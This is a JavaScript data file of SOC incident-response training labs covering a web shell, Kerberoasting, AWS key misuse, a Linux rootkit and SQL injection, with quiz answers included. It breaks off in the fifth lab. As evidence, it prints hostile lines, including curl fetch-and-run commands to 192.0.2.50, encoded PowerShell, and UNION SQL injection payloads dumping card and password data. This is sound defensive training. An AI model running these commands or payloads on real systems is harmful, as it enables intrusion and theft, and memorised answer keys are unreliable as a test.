// Six 5-step SOC incident labs. Each step reveals new evidence and asks one investigative question.
const r = String.raw;

export const labs = [
  {
    id: 'lab-01',
    title: 'Web Shell C2 on the Customer Portal',
    domain: 2,
    difficulty: 'Medium',
    xpReward: 250,
    briefing: 'Suricata fired a "Suspicious UA Beacon" alert from the DMZ web server portal-web01 (10.20.9.15) at 02:14 UTC. The server runs Apache + PHP for the customer portal. The on-call engineer says no deployments happened overnight. Determine how the attacker got in, what they are running, how it communicates, and scope the compromise before containment.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Validate the network alert',
        evidence: r`[**] [1:2000777:2] Suspicious UA Beacon [**]
03/14-02:14:10.221 10.20.9.15:44120 -> 198.51.100.200:80
03/14-02:15:10.198 10.20.9.15:44126 -> 198.51.100.200:80
03/14-02:16:10.240 10.20.9.15:44131 -> 198.51.100.200:80

$ tshark -r dmz.pcap -Y 'ip.src==10.20.9.15 && http.request' -T fields -e frame.time_delta_displayed -e http.request.method -e http.request.uri -e http.user_agent
60.012  POST  /gate.php  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
59.977  POST  /gate.php  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
60.041  POST  /gate.php  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)`,
        question: 'What best describes this traffic?',
        options: [
          'Normal web crawler activity hitting the portal',
          'Inbound SQL injection attempts against portal-web01',
          'Outbound C2 beaconing from the web server: fixed ~60 s interval, POSTs to a PHP gate, and an outdated IE7/XP User-Agent from a Linux host',
          'A misconfigured health check from the load balancer',
        ],
        correctIndex: 2,
        hint: 'Look at the direction (source IP), the timing deltas, and whether that User-Agent makes sense on a Linux Apache server.',
        walkthrough: 'The server itself initiates the requests (src 10.20.9.15), so this is egress, not an inbound attack. A near-constant 60-second delta is a beacon, and a Windows XP/IE7 User-Agent from a Linux web server is impossible for legitimate browsing. Mark the alert a true positive and move to Identification on the host.',
      },
      {
        stepNumber: 2,
        objective: 'Find the initial access vector in web logs',
        evidence: r`$ grep -E "POST /(uploads|profile)" /var/log/apache2/access.log | tail -5
192.0.2.50 - - [14/Mar/2026:01:51:02 +0000] "POST /profile/avatar HTTP/1.1" 200 88 "-" "Mozilla/5.0"
192.0.2.50 - - [14/Mar/2026:01:51:40 +0000] "POST /profile/avatar HTTP/1.1" 200 88 "-" "Mozilla/5.0"
192.0.2.50 - - [14/Mar/2026:01:52:05 +0000] "GET /uploads/avatars/5512.phtml HTTP/1.1" 200 22 "-" "Mozilla/5.0"
192.0.2.50 - - [14/Mar/2026:01:52:31 +0000] "GET /uploads/avatars/5512.phtml?c=id HTTP/1.1" 200 54 "-" "Mozilla/5.0"
$ file /var/www/portal/uploads/avatars/5512.phtml
5512.phtml: PHP script, ASCII text`,
        question: 'How did the attacker gain code execution?',
        options: [
          'SQL injection in the login form',
          'An unrestricted file upload: a PHP web shell was uploaded as an avatar with an executable .phtml extension, then called directly',
          'Stolen SSH credentials',
          'A vulnerable Apache module exploited over TLS',
        ],
        correctIndex: 1,
        hint: 'Follow the requests in order: what was uploaded, and what URL was requested right after?',
        walkthrough: 'The avatar upload accepted a .phtml file, which Apache executes as PHP. The attacker requested it directly and passed ?c=id, a classic web shell command parameter. Root cause: no extension/content allowlist and script execution enabled in the uploads directory. Preserve the file and logs before changing anything.',
      },
      {
        stepNumber: 3,
        objective: 'Identify the running implant',
        evidence: r`$ ps -eo pid,ppid,user,lstart,cmd --forest | grep -B1 -A2 www-data | tail -6
 1880     1 root     Sat Mar 14 00:00:01 2026 /usr/sbin/apache2 -k start
 2231  1880 www-data Sat Mar 14 01:53:10 2026  \_ /usr/sbin/apache2 -k start
 2290  2231 www-data Sat Mar 14 01:53:12 2026      \_ sh -c curl -s http://192.0.2.50/b -o /tmp/.b; chmod +x /tmp/.b; /tmp/.b
 2295  2290 www-data Sat Mar 14 01:53:14 2026          \_ /tmp/.b
$ ls -la /proc/2295/exe
lrwxrwxrwx 1 www-data www-data 0 Mar 14 02:20 /proc/2295/exe -> /tmp/.b (deleted)`,
        question: 'What is the most important observation for evidence preservation?',
        options: [
          'The implant /tmp/.b was deleted from disk but is still running; recover it from /proc/2295/exe before killing the process',
          'Apache is running as root, so the server must be reimaged immediately',
          'curl is a legitimate binary, so nothing here is malicious',
          'PID 2295 should be killed first to stop the beacon',
        ],
        correctIndex: 0,
        hint: 'Note the "(deleted)" marker on the exe link, and think about order of volatility.',
        walkthrough: 'The process tree shows apache2 (www-data) → sh → /tmp/.b, downloaded via the web shell. The binary was deleted after launch, but the running process still holds it: cp /proc/2295/exe /cases/b.bin and hash it. Also capture memory, /proc/2295/maps, cmdline and open sockets before containment. Killing the process first would lose the only copy.',
      },
      {
        stepNumber: 4,
        objective: 'Confirm C2 and extract IOCs',
        evidence: r`$ ss -tnp | grep 2295
ESTAB 0 0 10.20.9.15:44188  198.51.100.200:80  users:(("\.b",pid=2295,fd=3))
$ strings -n 8 /cases/b.bin | grep -E "http|gate|Mozilla|/bin" | head
http://198.51.100.200/gate.php
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
/bin/sh -c
sleep_interval=60
$ sha256sum /cases/b.bin
4f1c9e0b8a7d2e33c1a0f9e8b6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7  /cases/b.bin`,
        question: 'Which set of IOCs should be pushed to detection and blocking?',
        options: [
          'Only the attacker upload IP 192.0.2.50',
          'Every IP that visited the portal in the last day',
          'C2 198.51.100.200 and /gate.php, the IE7/XP User-Agent, the implant SHA-256, file path /tmp/.b, the web shell path, and upload source 192.0.2.50',
          'The Apache binary hash',
        ],
        correctIndex: 2,
        hint: 'You want network, host, and file indicators from both the initial access and the C2 stage.',
        walkthrough: 'The socket ties PID 2295 to the C2 IP, and strings confirm the gate URL, UA and 60-second sleep that matched the Suricata rule. A good IOC package covers network (C2 IP/URI/UA, staging IP), host (paths, hash) and initial access (web shell path) so you can sweep other servers and block egress.',
      },
      {
        stepNumber: 5,
        objective: 'Choose the containment and eradication plan',
        evidence: r`Asset: portal-web01  Owner: Customer Experience  RTO: 4h
Scope sweep (EDR + Suricata, last 14d):
  - 198.51.100.200 contacted ONLY by 10.20.9.15
  - /uploads/avatars/*.phtml present on portal-web01 only
  - No SMB/SSH from 10.20.9.15 to internal networks
Snapshot of portal-web01 disk + memory: COMPLETE (hashes recorded)`,
        question: 'What is the best next course of action?',
        options: [
          'Isolate portal-web01, block the C2 and staging IPs at egress, rebuild the server from a known-good image with upload fixes (extension allowlist, no script execution in uploads), rotate secrets on the host, then restore and monitor',
          'Delete 5512.phtml and /tmp/.b, then keep the server in production',
          'Shut down the entire DMZ for a week',
          'Do nothing because the attacker only had www-data privileges',
        ],
        correctIndex: 0,
        hint: 'Evidence is preserved and scope is limited to one host. Think short-term containment, eradication of root cause, and recovery.',
        walkthrough: 'With evidence captured and scope limited, contain (isolate the host, block C2/staging at egress), eradicate by rebuilding and fixing the vulnerable upload handler, rotate any credentials stored on the server (DB passwords, API keys), and recover with heightened monitoring for the IOCs. Partial cleanup leaves unknown persistence; a week-long DMZ outage is disproportionate. Capture lessons learned: upload validation and egress filtering from the DMZ.',
      },
    ],
  },
  {
    id: 'lab-02',
    title: 'Kerberoasting to Lateral Movement',
    domain: 3,
    difficulty: 'Hard',
    xpReward: 250,
    briefing: 'Microsoft Defender for Identity raised "Suspected Kerberos SPN exposure" for user jdoe on workstation FIN-WS22 (10.20.4.22). Two hours later, the file server FS01 shows a new service install. Work out what happened between those alerts, which credentials are exposed, and what must be reset.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Characterize the service-ticket burst',
        evidence: r`DC01 Security log  EventID 4769  (filtered: Client_Address=10.20.4.22, 01:05-01:06)
Time      Account   Service_Name   Ticket_Encryption_Type
01:05:11  jdoe      svc_sql        0x17
01:05:11  jdoe      svc_backup     0x17
01:05:12  jdoe      svc_web        0x17
01:05:12  jdoe      svc_print      0x17
...       (37 services total in 40 seconds)
Normal baseline for jdoe: 3-5 tickets/day, encryption type 0x12 (AES256)`,
        question: 'What does this evidence indicate?',
        options: [
          'jdoe opened many file shares at once',
          'Kerberoasting: jdoe\'s session requested RC4 service tickets for many SPN accounts, deviating from its AES baseline',
          'A golden ticket was forged',
          'The DC is misconfigured to use RC4',
        ],
        correctIndex: 1,
        hint: 'Compare the encryption type and volume with the stated baseline.',
        walkthrough: 'A sudden burst of 4769 requests for dozens of service accounts, all downgraded to RC4 (0x17) while the user normally gets AES (0x12), is the Kerberoasting signature. The tickets can be attacked offline, so any service account with a weak password should be assumed exposed. Next, determine how jdoe\'s session was used.',
      },
      {
        stepNumber: 2,
        objective: 'Determine how the jdoe session was used',
        evidence: r`FIN-WS22 Sysmon EventID 1 (Process Create)
01:03:58  ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
          Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
          CommandLine: powershell -nop -w hidden -enc SQBFAFgAIAAo...
01:05:09  ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
          Image:       C:\Users\jdoe\AppData\Local\Temp\r.exe
          CommandLine: r.exe kerberoast /nowrap
Email gateway: jdoe received "Q1_Bonus_Structure.docm" at 01:02:40`,
        question: 'What was the initial access and execution chain?',
        options: [
          'jdoe ran a legitimate admin script',
          'A macro-enabled phishing document launched hidden encoded PowerShell, which ran a Kerberoasting tool as jdoe',
          'An attacker logged in over RDP with jdoe\'s password',
          'A vulnerable VPN appliance was exploited',
        ],
        correctIndex: 1,
        hint: 'Read the parent/child chain and line it up with the email timestamp.',
        walkthrough: 'The .docm arrived at 01:02:40; Word spawned hidden encoded PowerShell at 01:03:58, which dropped and ran a tool with a "kerberoast" argument 71 seconds later, matching the 4769 burst. The attacker never needed jdoe\'s password because they ran code in jdoe\'s session. Scope the email campaign to other recipients.',
      },
      {
        stepNumber: 3,
        objective: 'Track lateral movement to FS01',
        evidence: r`FS01 Security log
03:12:44  4624  Logon Type 3  Account: svc_backup  Auth: NTLM  Source: 10.20.4.22
03:12:45  5145  Share: \\*\ADMIN$  RelativeTargetName: xKqp.exe  Access: WriteData
03:12:46  7045  Service Name: xKqpSvc  ImagePath: %SystemRoot%\xKqp.exe  Account: LocalSystem
03:12:50  4688  NewProcess: C:\Windows\System32\cmd.exe  Parent: C:\Windows\xKqp.exe
svc_backup: member of "Backup Operators" and local Administrators on all file servers`,
        question: 'Which conclusion is best supported?',
        options: [
          'The attacker used svc_backup credentials (likely recovered from its Kerberoasted ticket) to perform PsExec-style service execution on FS01 as SYSTEM',
          'svc_backup ran its normal nightly job',
          'FS01 was infected by a worm via SMBv1',
          'jdoe\'s account was used directly on FS01',
        ],
        correctIndex: 0,
        hint: 'Which account logged on, from which host, and what three events follow the logon?',
        walkthrough: 'svc_backup was in the Kerberoast list two hours earlier and now authenticates from jdoe\'s workstation, writes a random-named binary to ADMIN$, and creates a service that runs as SYSTEM: the PsExec pattern (4624 type 3 → 5145 → 7045). The service account\'s weak password was likely recovered offline. Its broad admin rights make it a high-impact compromise.',
      },
      {
        stepNumber: 4,
        objective: 'Scope credential exposure',
        evidence: r`PS> Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties PasswordLastSet, msDS-SupportedEncryptionTypes |
     Select Name, PasswordLastSet, msDS-SupportedEncryptionTypes
Name         PasswordLastSet       msDS-SupportedEncryptionTypes
svc_sql      2019-02-11            (not set: RC4 allowed)
svc_backup   2017-08-30            (not set: RC4 allowed)
svc_web      2025-11-02            24 (AES only)
svc_print    2018-05-19            (not set: RC4 allowed)
EDR on FS01 03:14:02: "lsass.exe memory read by xKqp.exe"`,
        question: 'Which accounts must be treated as compromised and reset?',
        options: [
          'All Kerberoasted SPN accounts with old RC4-capable passwords (svc_sql, svc_backup, svc_print), jdoe, plus any accounts whose credentials were cached on FS01 because LSASS was read there',
          'Only svc_backup',
          'Only jdoe',
          'No accounts, because Kerberos tickets expire after 10 hours',
        ],
        correctIndex: 0,
        hint: 'Two exposure paths exist: offline attack on service tickets, and the LSASS read on FS01.',
        walkthrough: 'Every SPN account whose ticket was requested is exposed to offline guessing; old passwords with RC4 allowed are the most at risk, and svc_backup proves it. The LSASS read on FS01 exposes any credentials cached there (admins who logged in, other service accounts). jdoe is compromised via the endpoint. Ticket expiry does not matter once a password is known.',
      },
      {
        stepNumber: 5,
        objective: 'Plan eradication and hardening',
        evidence: r`Proposed actions (choose the best plan):
- Containment already done: FIN-WS22 and FS01 network-isolated via EDR at 03:20
- Attacker C2: 198.51.100.77:443 (blocked at egress 03:22)
- No evidence of DCSync (no 4662 replication from non-DCs)
- Backup jobs depend on svc_backup`,
        question: 'What is the best eradication and hardening plan?',
        options: [
          'Rebuild FIN-WS22 and FS01, reset all exposed accounts (coordinating with backup owners), migrate service accounts to gMSA or long random passwords with AES-only, reduce svc_backup privileges, block macros from the internet, and add honey SPN and RC4 4769 detections',
          'Reset jdoe only and re-enable the hosts',
          'Reset krbtgt twice and do nothing else',
          'Disable Kerberos and use NTLM only',
        ],
        correctIndex: 0,
        hint: 'Address the entry vector, the exposed credentials, the excessive privilege, and detection gaps.',
        walkthrough: 'Rebuild both compromised hosts, rotate every exposed credential (planning around backup dependencies), and fix root causes: gMSA/strong AES-only service accounts, least privilege for svc_backup, and blocking internet macros via policy. krbtgt reset is warranted when the domain itself is compromised (e.g., DCSync); there is no evidence of that here, though it remains a judgment call. Disabling Kerberos would make things worse.',
      },
    ],
  },
  {
    id: 'lab-03',
    title: 'AWS IAM Access Key Compromise',
    domain: 3,
    difficulty: 'Medium',
    xpReward: 250,
    briefing: 'GuardDuty reported PenTest:IAMUser/KaliLinux for IAM user ci-deploy in production account 111122223333 at 06:58 UTC. ci-deploy is used by the build pipeline to push artifacts to S3. Investigate the activity in CloudTrail, find persistence and data access, and contain without breaking production more than necessary.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Confirm the key is being misused',
        evidence: r`$ aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=ci-deploy \
   --start-time 2026-03-14T00:00Z --query 'Events[].CloudTrailEvent' --output text | jq -r '[.eventTime,.eventName,.sourceIPAddress,.userAgent]|@tsv'
2026-03-14T03:00:12Z  PutObject         34.201.10.5    aws-sdk-go/1.44 (build-runner)
2026-03-14T06:57:40Z  GetCallerIdentity 45.155.205.11  aws-cli/2.15.0 ... exe/x86_64.kali.2024
2026-03-14T06:58:02Z  ListBuckets       45.155.205.11  aws-cli/2.15.0 ... exe/x86_64.kali.2024
2026-03-14T06:58:30Z  ListUsers         45.155.205.11  aws-cli/2.15.0 ... exe/x86_64.kali.2024`,
        question: 'Which observation most clearly separates attacker activity from legitimate use?',
        options: [
          'The legitimate pipeline uses a known build-runner IP and SDK user agent, while the attacker calls come from a new IP with a Kali CLI user agent starting with GetCallerIdentity',
          'All events come from the same IP',
          'PutObject is always malicious',
          'ListBuckets can only be called by root',
        ],
        correctIndex: 0,
        hint: 'Compare sourceIPAddress and userAgent across the four events.',
        walkthrough: 'The 03:00 PutObject from the build runner matches normal usage. From 06:57, a different IP with a Kali user agent performs the classic reconnaissance sequence: whoami (GetCallerIdentity), then enumeration (ListBuckets, ListUsers). The key itself is valid, so the signal is context: IP, user agent, and API pattern.',
      },
      {
        stepNumber: 2,
        objective: 'Look for persistence',
        evidence: r`2026-03-14T07:02:11Z  CreateUser            userName=aws-health-monitor
2026-03-14T07:02:15Z  AttachUserPolicy      userName=aws-health-monitor policyArn=arn:aws:iam::aws:policy/AdministratorAccess
2026-03-14T07:02:19Z  CreateAccessKey       userName=aws-health-monitor -> AKIA7QWEEXAMPLEZ0P1
2026-03-14T07:03:40Z  UpdateAssumeRolePolicy roleName=OrgAuditRole  Principal: arn:aws:iam::999988887777:root
(all from 45.155.205.11, identity ci-deploy)`,
        question: 'How many independent persistence mechanisms were created?',
        options: [
          'Two: a new admin IAM user with its own access key, and a backdoored role trust policy allowing an external account to assume OrgAuditRole',
          'One: the new user',
          'None; these are read-only calls',
          'Three: one for each API call',
        ],
        correctIndex: 0,
        hint: 'Group the calls by what they let the attacker do after ci-deploy is disabled.',
        walkthrough: 'CreateUser + AttachUserPolicy + CreateAccessKey together form one backdoor (a separate admin identity). UpdateAssumeRolePolicy is a second, independent backdoor: account 999988887777 can assume OrgAuditRole regardless of IAM users. Both must be removed, or disabling ci-deploy alone leaves the attacker in.',
      },
      {
        stepNumber: 3,
        objective: 'Assess data access',
        evidence: r`Athena query on org CloudTrail (data events enabled for prod buckets):
SELECT eventname, json_extract_scalar(requestparameters,'$.bucketName') AS bucket, count(*) AS n
FROM cloudtrail WHERE useridentity.accesskeyid IN ('AKIA4XVQEXAMPLE7M2Q','AKIA7QWEEXAMPLEZ0P1')
  AND eventtime > '2026-03-14T06:50' GROUP BY 1,2 ORDER BY n DESC;
eventname   bucket                  n
GetObject   corp-finance-exports    1,284
ListObjects corp-finance-exports    16
GetObject   build-artifacts         12
PutBucketPolicy corp-finance-exports 1`,
        question: 'What is the most significant data-access finding?',
        options: [
          'Only build artifacts were touched',
          'Data events are not reliable, so ignore this',
          'ListObjects proves nothing was downloaded',
          '1,284 objects were downloaded from the finance export bucket and its bucket policy was changed, which suggests both exfiltration and possibly public exposure',
        ],
        correctIndex: 3,
        hint: 'Which bucket was read the most, and what configuration change was made to it?',
        walkthrough: 'Because S3 data events were enabled, you can count GetObject calls: 1,284 finance objects read by attacker keys. The PutBucketPolicy on the same bucket must be inspected immediately; it may grant public access for anonymous download that would not show under the attacker identity. This drives legal/privacy notification scoping.',
      },
      {
        stepNumber: 4,
        objective: 'Execute containment in the right order',
        evidence: r`Business constraint: the build pipeline must resume within 2 hours.
Available actions:
 a) update-access-key ci-deploy key -> Inactive
 b) attach deny-all inline policy to aws-health-monitor; deactivate its key
 c) restore OrgAuditRole trust policy from IaC; revoke its sessions (TokenIssueTime deny)
 d) revert corp-finance-exports bucket policy; confirm Block Public Access
 e) issue pipeline a new short-lived role via OIDC federation`,
        question: 'Which containment approach is best?',
        options: [
          'Only (a), then wait for more evidence',
          'Perform a, b, c and d together as quickly as possible (to avoid tipping off the attacker while backdoors remain), then e to restore the pipeline',
          'Delete the AWS account',
          'Do e first, and the rest next week',
        ],
        correctIndex: 1,
        hint: 'Partial containment warns the attacker while leaving them other ways in.',
        walkthrough: 'Contain all known access paths in one coordinated action: the original key, the backdoor user, the backdoored role (including active sessions), and the data exposure. Doing only one lets the attacker notice and pivot to the remaining backdoors. Then restore business function with a safer design (OIDC-issued short-lived credentials instead of static keys).',
      },
      {
        stepNumber: 5,
        objective: 'Identify root cause and lessons learned',
        evidence: r`$ git log --all -S 'AKIA4XVQ' --oneline
7d1e9a2 add deploy script (2023-11-02, public mirror: github.com/corp-oss/portal-tools)
Secret scanning: disabled for the public mirror
Key age: 1,017 days, never rotated
GuardDuty alert -> PagerDuty acknowledged after 4 minutes`,
        question: 'Which lessons-learned recommendations address the root cause?',
        options: [
          'Make the public repository private and change nothing else',
          'Block the Kali user agent at the WAF',
          'Disable GuardDuty to reduce noise',
          'Replace static CI keys with OIDC short-lived roles, enable secret scanning/push protection on all repos, enforce key rotation and alert on old keys, and add SCP guardrails against trail tampering and IAM backdoors',
        ],
        correctIndex: 3,
        hint: 'The key was exposed publicly for years and never rotated. Fix the class of problem, not just this instance.',
        walkthrough: 'The root cause is a long-lived static key committed to a public mirror without secret scanning. Removing static keys from CI (OIDC federation), push protection, rotation enforcement, and preventive SCPs address the whole class. Detection worked well (GuardDuty + quick acknowledgment), which belongs in the report too. User-agent blocking is trivially bypassed.',
      },
    ],
  },
  {
    id: 'lab-04',
    title: 'Linux Rootkit and Persistence on Build Server',
    domain: 5,
    difficulty: 'Hard',
    xpReward: 250,
    briefing: 'The NetOps team noticed build01 (10.20.12.40, Ubuntu 22.04) sending steady TLS traffic to 192.0.2.50:443, but ps and netstat on the box show nothing unusual. CPU usage has been near 100% for two days. Use cross-view analysis to uncover what is hidden, enumerate persistence, and decide how to eradicate.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Detect hiding with cross-view analysis',
        evidence: r`$ ps -e | wc -l
142
$ ls -d /proc/[0-9]* | wc -l
145
$ for p in /proc/[0-9]*; do pid=${'$'}{p#/proc/}; ps -p $pid >/dev/null || echo "hidden: $pid $(tr '\0' ' ' < $p/cmdline)"; done
hidden: 4410 /usr/lib/.cache/kworker -c 192.0.2.50:443
hidden: 4411 /tmp/.x/miner --donate-level 0
hidden: 4412 /tmp/.x/miner --donate-level 0`,
        question: 'What does the mismatch between ps and /proc indicate?',
        options: [
          'ps is slow and missed some processes',
          'The kernel is out of memory',
          'The processes are zombies',
          'A rootkit is hiding processes from ps (user-mode hooking or modified binaries), but they still exist in /proc',
        ],
        correctIndex: 3,
        hint: 'Both views ask "what processes exist?" through different paths. Why would they disagree?',
        walkthrough: 'Cross-view comparison is a core rootkit detection technique: list processes one way (ps) and another way (/proc directly) and diff. Three processes, including a C2 client and cryptominers, are hidden from ps. That explains the CPU load and the unexplained TLS flow. Next, find the hiding mechanism.',
      },
      {
        stepNumber: 2,
        objective: 'Identify the hiding mechanism',
        evidence: r`$ cat /etc/ld.so.preload
/usr/lib/x86_64-linux-gnu/libprocesshider.so
$ debsums -c 2>/dev/null
(no output)
$ busybox-static ps | grep -c miner
2
$ ls -la --time-style=full-iso /usr/lib/x86_64-linux-gnu/libprocesshider.so
-rwxr-xr-x 1 root root 16512 2026-03-12 22:41:07.000000000 +0000 libprocesshider.so`,
        question: 'Which rootkit type is this, and why does busybox-static still see the miners?',
        options: [
          'A kernel module rootkit; busybox has kernel access',
          'A userland LD_PRELOAD rootkit: the preloaded library hooks libc in dynamically linked tools, while statically linked busybox does not load it',
          'Trojaned ps binary; busybox is newer',
          'A firmware rootkit',
        ],
        correctIndex: 1,
        hint: 'debsums found no modified package binaries. What does /etc/ld.so.preload do to every dynamically linked program?',
        walkthrough: '/etc/ld.so.preload injects the library into every dynamically linked process, where it filters readdir() results for /proc. Package binaries are unmodified (debsums is clean), and a static binary bypasses the hook. A kernel rootkit would hide from busybox too. Preserve the .so for analysis; it was installed on 03-12 22:41, which anchors the timeline.',
      },
      {
        stepNumber: 3,
        objective: 'Enumerate persistence',
        evidence: r`$ systemctl cat kworker-helper.service | grep -E "ExecStart|Restart"
ExecStart=/usr/lib/.cache/kworker -c 192.0.2.50:443
Restart=always
$ cat /etc/cron.d/apt-compat-check
*/10 * * * * root [ -f /tmp/.x/miner ] || curl -fsSL http://192.0.2.50/m.sh | bash
$ tail -1 /root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0... ops@build
$ awk -F: '$3==0' /etc/passwd
root:x:0:0:root:/root:/bin/bash`,
        question: 'Which persistence mechanisms must be removed?',
        options: [
          'Only the systemd service',
          'The UID 0 root account',
          'Only the cron job',
          'The systemd service (C2 client), the cron.d re-installer for the miner, the ld.so.preload rootkit, and the unknown root SSH key (to be verified against the ops team)',
        ],
        correctIndex: 3,
        hint: 'Check each output: is it attacker-controlled? The /etc/passwd output only shows the real root.',
        walkthrough: 'There are layered mechanisms: a systemd unit that restarts the C2 client, a cron job disguised as an apt task that reinstalls the miner, the preload rootkit, and an SSH key whose comment looks legitimate but must be verified (comments are attacker-controlled). Only the genuine root has UID 0, so no backdoor account exists. Missing any one layer means reinfection.',
      },
      {
        stepNumber: 4,
        objective: 'Determine initial access',
        evidence: r`$ journalctl -u jenkins --since "2026-03-12 22:00" --until "2026-03-12 23:00" | grep -i script
Mar 12 22:39:55 build01 jenkins[1022]: Script console executed by anonymous from 192.0.2.50
$ grep -A2 "<useSecurity>" /var/lib/jenkins/config.xml
<useSecurity>false</useSecurity>
$ grep "Accepted" /var/log/auth.log | grep 192.0.2.50
(no output)`,
        question: 'What was the initial access vector?',
        options: [
          'SSH brute force',
          'A phishing email to a developer',
          'An unauthenticated Jenkins Script Console (security disabled), giving code execution two minutes before the rootkit was installed',
          'A malicious npm package',
        ],
        correctIndex: 2,
        hint: 'Line up the times: when was the rootkit installed, and what happened just before?',
        walkthrough: 'Jenkins had security disabled, so anyone could reach the Groovy Script Console and run commands as the jenkins user (which was then escalated to root). The console was used by 192.0.2.50 at 22:39:55, and the rootkit library appeared at 22:41:07. SSH was not used. This becomes the root-cause fix.',
      },
      {
        stepNumber: 5,
        objective: 'Decide on eradication',
        evidence: r`build01 role: Jenkins controller; holds credentials for GitHub deploy keys, Docker registry, and AWS deploy role
Root-level compromise: confirmed
Evidence collected: memory (LiME), disk image, copies of .so / kworker / miner (hashed)
Available: Jenkins configuration-as-code repo, clean golden image`,
        question: 'What is the right eradication approach?',
        options: [
          'Remove the four persistence items and reboot',
          'Rebuild build01 from the golden image with Jenkins security enabled and the Script Console restricted, rotate every credential Jenkins held, review artifacts built since 03-12 for tampering, and block 192.0.2.50',
          'Reinstall Jenkins only',
          'Run an antivirus scan and keep the server',
        ],
        correctIndex: 1,
        hint: 'The attacker had root on a machine that signs and ships software and holds many secrets.',
        walkthrough: 'With root compromise you cannot trust the OS, so rebuild from known-good media. A CI server is a supply-chain risk: every secret it held (deploy keys, registry, AWS role) must be rotated, and artifacts built during the compromise window must be verified or rebuilt. Fix the root cause by enabling Jenkins authentication/authorization and restricting the script console.',
      },
    ],
  },
  {
    id: 'lab-05',
    title: 'SQL Injection Data Exfiltration',
    domain: 4,
    difficulty: 'Medium',
    xpReward: 250,
    briefing: 'A payment processor notified Corp that cards used on shop.corp.com are appearing in fraud. The shop runs Nginx + PHP-FPM + MySQL on shop-web02. Determine whether the site was breached, how, what data was taken, and what to tell the privacy team.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Triage web logs for attack activity',
        evidence: r`$ awk '{print $1}' /var/log/nginx/access.log* | sort | uniq -c | sort -rn | head -3
  21430 203.0.113.9
   1208 10.20.4.31
    988 198.51.100.4
$ awk '$1=="203.0.113.9" {print $9}' /var/log/nginx/access.log* | sort | uniq -c
  18020 404
   3280 200
    130 500
$ awk '$1=="203.0.113.9" && $9==500 {print $7}' /var/log/nginx/access.log* | head -2
/products.php?id=12%27
/products.php?id=12%27%20AND%201=CONVERT(int,@@version)--`,
        question: 'What is the best interpretation of this triage?',
        options: [
          '203.0.113.9 is a search engine and can be ignored',
          '10.20.4.31 is the attacker because it is internal',
          'The site is suffering a DDoS',
          '203.0.113.9 performed content discovery (many 404s) and then probed products.php with SQL injection payloads that caused server errors',
        ],
        correctIndex: 3,
        hint: 'Look at status code distribution and the URIs that produced 500 errors.',
        walkthrough: 'High volume plus mostly 404s suggests forced browsing. The 500s on products.php are triggered by a single quote and error-based injection probes, showing the id parameter reaches SQL unsanitized. Focus the investigation on 203.0.113.9 and products.php.',
      },
      {
        stepNumber: 2,
        objective: 'Confirm the vulnerability in application logs',
        evidence: r`/var/log/nginx/error.log
2026/03/10 09:13:01 [error] FastCGI sent in stderr: "PHP Warning: mysqli_query(): You have an error in your SQL syntax ... near ''12''' at line 1 in /var/www/shop/products.php on line 41"
$ sed -n '38,42p' /var/www/shop/products.php
38  $id = $_GET['id'];
39  // input used as-is
40  $sql = "SELECT name, price, descr, img FROM products WHERE id = '" . $id . "'";
41  $res = mysqli_query($conn, $sql);`,
        question: 'What is the root-cause vulnerability?',
        options: [
          'Weak MySQL root password',
          'Missing HTTPS',
          'A vulnerable Nginx version',
          'User input from $_GET[\'id\'] is concatenated directly into a SQL string instead of using a parameterized query',
        ],
        correctIndex: 3,
        hint: 'Read line 40 carefully: where does $id come from and how is it used?',
        walkthrough: 'String concatenation of untrusted input into SQL is the textbook cause of SQL injection. The fix is a prepared statement with a bound parameter (mysqli_prepare / PDO). The error log confirms the attacker\'s quote broke the syntax at that exact line.',
      },
      {
        stepNumber: 3,
        objective: 'Determine what data was extracted',
        evidence: r`$ grep 203.0.113.9 /var/log/nginx/access.log* | grep -i union | awk '{print $4, $7, $9, $10}' | sed 's/%20/ /g' | tail -4
[10/Mar/2026:09:40:11 /products.php?id=-1' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- - 200 9840
[10/Mar/2026:09:41:02 /products.php?id=-1' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='payments'-- - 200 1220
[10/Mar/2026:09:44:30 /products.php?id=-1' UNION SELECT card_number,exp,cvv,name FROM payments LIMIT 0,500-- - 200 41210
[10/Mar/2026:09:46:55 /products.php?id=-1' UNION SELECT email,password_hash,3,4 FROM customers-- - 200 388120`,
        question: 'Which data categories should be treated as exfiltrated?',
        options: [
          'Only the database schema',
          'Nothing, because UNION queries only return product data',
          'Payment card data (card number, expiry, CVV, name) and customer emails with password hashes',
          'Only product prices',
        ],
        correctIndex: 2,
        hint: 'Read the SELECT targets in the last two requests and check the response sizes.',
        walkthrough: 'The attacker followed the standard progression: enumerate tables, then columns of payments, then dump payments and customers. 200 responses with large byte counts indicate data was returned. Storing CVV at all violates PCI DSS. This triggers card-brand/PCI forensic obligations and privacy notification analysis; password hashes mean customer password resets.',
      },
      {
        stepNumber: 4,
        objective: 'Quantify the impact',
        evidence: r`$ grep 203.0.113.9 /var/log/nginx/access.log* | grep -c "FROM payments LIMIT"
86
(offsets 0 .. 42500, step 500)
mysql> SELECT COUNT(*) FROM payments;   -> 43,012
mysql> SELECT COUNT(*) FROM customers;  -> 120,455
mysql> SHOW VARIABLES LIKE 'general_log';  -> OFF`,
        question: 'What is the most defensible estimate of affected payment records?',
        options: [
          'Approximately all 43,012 payment records (86 paged queries × 500 covering offsets 0 to 43,000), with the caveat that the DB general log was off so the estimate comes from web logs',
          '500 records, because each query had LIMIT 500',
          'Zero, because the general log is off',
          '120,455, the customer count',
        ],
        correctIndex: 0,
